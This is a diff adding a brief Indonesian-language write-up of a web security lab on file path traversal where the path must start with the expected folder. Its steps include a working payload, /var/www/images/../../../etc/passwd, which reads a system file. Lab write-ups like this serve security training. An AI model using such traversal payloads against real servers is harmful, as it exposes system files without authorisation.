@@ -1,0 +1,18 @@
+LAB 5 File path traversal, validation of start of path
+
+Brief:
+	Laboratorium ini mengandung kerentanan path traversal dalam tampilan gambar produk. aplikasi mengharapkan jalur folder yang sesuai
+	
+	
+Tujuan:
+
+	dapatkan /etc/passwd
+	
+	
+Analisa:
+
+	1. kirim request gambar ke repeater
+	
+	2. langsung saja tambahkan /var/www/images/../../../etc/passwd
+
+	3. berhasil
